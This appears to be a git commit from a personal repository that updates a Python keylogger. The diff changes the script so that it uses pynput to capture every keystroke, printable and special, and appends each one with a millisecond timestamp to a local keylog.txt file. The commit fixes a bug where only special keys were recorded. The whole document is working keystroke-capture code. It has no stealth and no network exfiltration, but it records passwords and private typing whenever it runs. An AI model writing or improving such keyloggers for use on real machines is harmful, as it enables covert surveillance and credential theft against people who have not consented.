b11b113071deb2bd349a0099317a5c531379bc41
sankar <181142203+sankarlmao@users.noreply.github.com>
2025-07-18 18:55:31 +0530

    Update keylogger.py
    updated keylogger (it was only recording special characters)

--- keylogger.py
+++ keylogger.py
@@ -1,19 +1,13 @@
 from pynput import keyboard
-import logging
-
-
-log_file = "keylog.txt"
-logging.basicConfig(
-    filename=log_file,
-    level=logging.DEBUG,
-    format='%(asctime)s: %(message)s'
-)
+from datetime import datetime
 
 def on_press(key):
-    try:
-        logging.info(f'Key {key.char} pressed')
-    except AttributeError:
-        logging.info(f'Special key {key} pressed')
+    with open("keylog.txt", "a") as f:
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S,%f')[:-3]
+        try:
+            f.write(f"{timestamp}: {key.char} pressed\n")
+        except AttributeError:
+            f.write(f"{timestamp}: Special key {key} pressed\n")
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
